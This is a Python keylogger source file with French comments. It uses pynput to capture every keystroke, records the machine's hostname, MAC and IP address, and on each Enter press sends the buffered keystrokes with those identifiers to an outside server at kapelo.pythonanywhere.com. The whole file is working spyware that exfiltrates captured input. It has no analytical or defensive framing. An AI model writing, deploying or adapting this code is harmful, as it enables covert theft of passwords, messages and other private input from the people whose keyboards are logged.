from pynput import keyboard
import requests
import json
import socket
from datetime import datetime
import uuid

class Keylogger:
    def __init__(self):
        self.logs = ""
        self.machine_id = socket.gethostname()
        self.mac_address = self.get_mac_address()  # Récupérer l'adresse MAC
        self.ip_address = self.get_ip_address()    # Récupérer l'adresse IP
        self.api_url = "https://kapelo.pythonanywhere.com/log"
        self.is_sending = False  # Drapeau pour contrôler l'envoi
        print(f"Keylogger démarré sur {self.machine_id} avec MAC {self.mac_address} et IP {self.ip_address}")

    def get_mac_address(self):
        """Récupérer l'adresse MAC de la machine"""
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2 * 6, 2)][::-1])
        return mac

    def get_ip_address(self):
        """Récupérer l'adresse IP de la machine"""
        try:
            hostname = socket.gethostname()
            ip_address = socket.gethostbyname(hostname)
            return ip_address
        except Exception as e:
            print(f"Erreur lors de la récupération de l'adresse IP: {e}")
            return "0.0.0.0"

    def send_logs(self):
        """Envoyer les logs au serveur"""
        if not self.logs.strip():  # Ne pas envoyer si vide
            return

        try:
            data = {
                "machine_id": self.machine_id,
                "mac_address": self.mac_address,  # Inclure l'adresse MAC
                "ip_address": self.ip_address,      # Inclure l'adresse IP
                "timestamp": datetime.now().isoformat(),
                "keystrokes": self.logs
            }
            
            response = requests.post(
                self.api_url,
                json=data,
                headers={"Content-Type": "application/json"}
            )
            
            if response.status_code == 200:
                print("Données envoyées avec succès!")
                self.logs = ""  # Réinitialiser les logs après envoi réussi
            else:
                print(f"Erreur lors de l'envoi: {response.status_code}")
        except Exception as e:
            print(f"Erreur d'envoi: {e}")

    def on_press(self, key):
        try:
            # Si c'est la touche Enter
            if key == keyboard.Key.enter and not self.is_sending:
                self.is_sending = True  # Indiquer que nous sommes en train d'envoyer
                print(f"Envoi des données: {self.logs}")
                self.send_logs()  # Envoyer les données
                return

            # Pour toutes les autres touches
            if key == keyboard.Key.space:
                self.logs += " "
            elif hasattr(key, 'char'):
                self.logs += str(key.char)
            print(f"Buffer actuel: {self.logs}")

        except Exception as e:
            print(f"Erreur lors de la capture: {e}")
        finally:
            # Réinitialiser le drapeau après l'envoi
            if key == keyboard.Key.enter:
                self.is_sending = False

    def start(self):
        print("Démarrage du keylogger...")
        with keyboard.Listener(on_press=self.on_press) as listener:
            print("En écoute des touches...")
            listener.join()

if __name__ == "__main__":
    try:
        keylogger = Keylogger()
        keylogger.start()
    except Exception as e:
        print(f"Erreur critique: {e}")
